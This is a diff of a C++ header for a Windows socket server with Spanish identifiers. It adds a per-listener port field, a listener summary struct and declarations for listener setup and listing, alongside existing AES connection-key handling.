@@ -94,8 +94,16 @@ struct Servidor_Listener {
     SOCKET sckSocket;
     struct sockaddr_in struct_Listener;
     std::string strNombre;
+    int iPuerto = 0;
     bool isRunning = false;
     char con_key[AES_KEY_LEN+1]; //Llave a usar en la conexion
+};
+
+struct Listener_List_Data {
+    std::string nombre;
+    std::string clave_acceso;
+    std::string puerto;
+    std::string estado;
 };
 
 namespace LogType{
@@ -260,8 +268,6 @@ class Cliente_Handler {
 
 class Servidor{
     private:
-        fd_set fd_Master;
-
         SOCKET sckSocket = INVALID_SOCKET;
         u_int uiPuertoLocal = 0;
         WSADATA wsa;
@@ -273,6 +279,7 @@ class Servidor{
         ByteArray bKey;
         void Init_Key();
         bool Init_Socket(SOCKET& _socket, u_int _puerto, struct sockaddr_in& _struct_listener);
+        void Init_Listen(SOCKET& _socket);
         
         std::vector<Servidor_Listener> vc_Listeners;
         
@@ -345,6 +352,7 @@ class Servidor{
         void m_ToggleListener(const std::string _nombre_listener);
         Servidor_Listener m_ObtenerListener(SOCKET& _socket);
         fd_set m_CopiaFD();
+        std::vector<Listener_List_Data> m_ListenerVectorCopy();
 
         //Mapa mutex
         std::shared_ptr<std::mutex> m_GetMutex(SOCKET pSocket);
